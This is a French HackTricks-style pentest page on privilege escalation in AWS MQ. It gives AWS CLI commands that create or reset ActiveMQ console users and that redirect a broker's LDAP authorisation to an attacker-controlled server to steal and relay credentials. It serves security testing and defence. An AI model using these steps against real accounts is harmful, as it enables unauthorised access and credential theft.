# AWS - MQ Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## MQ

Pour plus d'informations sur MQ, consultez :

{{#ref}}
../../aws-services/aws-mq-enum.md
{{#endref}}

### `mq:ListBrokers`, `mq:CreateUser`

Avec ces permissions, vous pouvez **créer un nouvel utilisateur dans un broker ActimeMQ** (cela ne fonctionne pas avec RabbitMQ) :
```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```
**Impact potentiel :** Accéder à des informations sensibles en naviguant dans ActiveMQ

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

Avec ces autorisations, vous pouvez **créer un nouvel utilisateur dans un ActimeMQ broker** (cela ne fonctionne pas avec RabbitMQ):
```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```
**Impact potentiel :** Accéder à des informations sensibles en naviguant dans ActiveMQ

### `mq:ListBrokers`, `mq:UpdateBroker`

Si un broker utilise **LDAP** pour l'autorisation avec **ActiveMQ**, il est possible de **modifier** la **configuration** du serveur LDAP utilisé pour le remplacer par **un serveur contrôlé par l'attaquant**. De cette façon, l'attaquant pourra **voler tous les identifiants envoyés via LDAP**.
```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```
Si vous parveniez d'une manière ou d'une autre à trouver les credentials originaux utilisés par ActiveMQ, vous pourriez effectuer un MitM, voler les creds, les utiliser sur le serveur d'origine et renvoyer la réponse (peut‑être qu'en réutilisant simplement les creds volés vous pourriez faire cela).

**Impact potentiel :** Voler les identifiants ActiveMQ

{{#include ../../../../banners/hacktricks-training.md}}
